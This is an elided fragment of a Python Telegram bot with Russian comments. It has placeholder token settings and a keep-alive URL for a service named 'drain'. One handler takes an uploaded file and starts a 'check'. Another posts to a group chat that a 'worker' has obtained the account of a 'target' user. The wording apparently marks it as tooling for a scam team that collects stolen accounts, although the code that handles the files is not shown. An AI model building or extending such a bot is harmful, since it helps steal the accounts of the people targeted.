...
# 🔑 Токен бота
BOT_TOKEN = "ВАШ_BOT_TOKEN"  # <-- вставьте сюда токен бота
GROUP_CHAT_ID = "-1001234567890"  # <-- вставьте сюда ID группы

# 🔹 Жёстко прописанные настройки веб-сервера и keep-alive
PORT = 10000
RENDER_EXTERNAL_URL = "https://drain-8kmc.onrender.com"  # <-- URL сервиса
...
async def receive_file(message: types.Message):
    ...
    await message.answer("Файл получен! Проверка запущена...\nОжидание до 10 секунд.")
...
async def chek_command(message: types.Message):
    ...
    if GROUP_CHAT_ID:
        ...
        await bot.send_message(GROUP_CHAT_ID, f"Воркер {worker} получил аккаунт {target_username}")
